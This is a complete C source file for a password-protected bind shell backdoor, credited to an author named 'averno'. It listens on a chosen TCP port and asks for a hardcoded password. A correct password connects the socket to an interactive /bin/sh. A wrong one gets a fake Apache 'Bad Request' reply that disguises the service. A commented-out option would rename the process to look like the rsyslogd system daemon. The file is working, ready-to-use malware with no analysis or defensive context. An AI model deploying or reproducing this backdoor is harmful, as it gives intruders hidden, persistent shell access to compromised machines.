/*
 * dup2.c              By averno.
 * avernopolis#gmail.com | sed -e 's/#/@/'
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>

/* #define hide "rsyslogd -c 3" */

int main(int argc, char *argv[])
{

   struct sockaddr_in server;
   struct sockaddr_in client;

   char *fake = "HTTP/1.1 400 Bad Request\n"
                "Content-Type: text/html\n"
                "Server: Apache 1.2.7\n"
                "Connection: close\n"
                "\n"
                "Bad Request.\n\n";

   char pass[] = "topotamadre";
           
   int on = 1;
   int fd, fc;
   int sin_size, readbytes;
   char buf[512];
   
   if (argc != 2) {
     fprintf(stderr, "[~] Uso: %s <port>\n\n", argv[0]);
     exit(0);
   }

/*   strcpy(argv[0], hide); */

   if ((fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
     fprintf(stderr, "[~] Can not create socket!: %s\n\n", strerror(errno));
     exit(-1);
   }

   if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR,(char *)&on, sizeof(on)) == -1) {
     perror("setsockopt()");
     exit(-1);
   }

   memset(&server, 0, sizeof(server));
   server.sin_family = AF_INET;
   server.sin_port = htons(atoi(argv[1]));
   server.sin_addr.s_addr = INADDR_ANY;

   if (bind(fd, (struct sockaddr *)&server, sizeof(server)) == -1) {
     perror("bind()");
     exit(-1);
   }

   if (listen(fd, 5) == -1) {
     perror("listen()");
     exit(-1);
   }

   sin_size = sizeof(struct sockaddr_in);

   while (1) {
        if ((fc = accept(fd, (struct sockaddr *)&client, &sin_size)) == -1) {
          perror("accept()");
          exit(-1);
        }

        if (fork() == 0) {
          close(fd);
         
          memset(&buf, 0, sizeof(buf));
 
          write(fc, "password:", 9);

          if ((readbytes = read(fc, buf, 512-1)) != 1) {
            buf[readbytes] = '\0';
       /*   printf("bytes readed: %i, buf: %s\n", readbytes, buf); */
            if (strncmp(buf, pass, 10) == 0) {

              close(0);
              close(1);
              close(2);
 
              dup2(fc, 0);
              dup2(fc, 1);
              dup2(fc, 2);

              execl("/bin/sh", "/bin/sh", "-i", NULL);
            }

            else {
                write(fc, fake, strlen(fake));
                close(fc);
                exit(0);
           }
         }

           close(fc);
           exit(0);
        }

        else {
            close(fc);
        }
   }

   return 0;

}
/* EOF */
